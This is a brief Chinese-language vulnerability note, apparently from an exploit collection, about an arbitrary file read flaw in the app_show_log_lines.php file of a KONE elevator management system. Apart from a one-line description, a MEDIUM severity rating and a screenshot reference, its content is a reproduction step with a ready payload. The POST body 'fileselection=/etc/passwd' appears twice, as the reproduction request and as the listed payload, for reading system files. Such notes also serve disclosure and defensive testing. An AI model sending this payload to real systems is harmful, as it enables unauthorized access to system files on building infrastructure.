# KONE 通力电梯管理系统 app_show_log_lines.php 任意文件读取漏洞

## 漏洞描述
KONE 通力电梯 app_show_log_lines.php文件过滤不足导致任意文件读取漏洞

## 危害等级
MEDIUM

## 参考链接

## 漏洞复现方法
主页面

![image-20220519184439370](images/202205191844461.png)

发送POST请求包

```
fileselection=/etc/passwd
```


## Payloads
```
fileselection=/etc/passwd
```
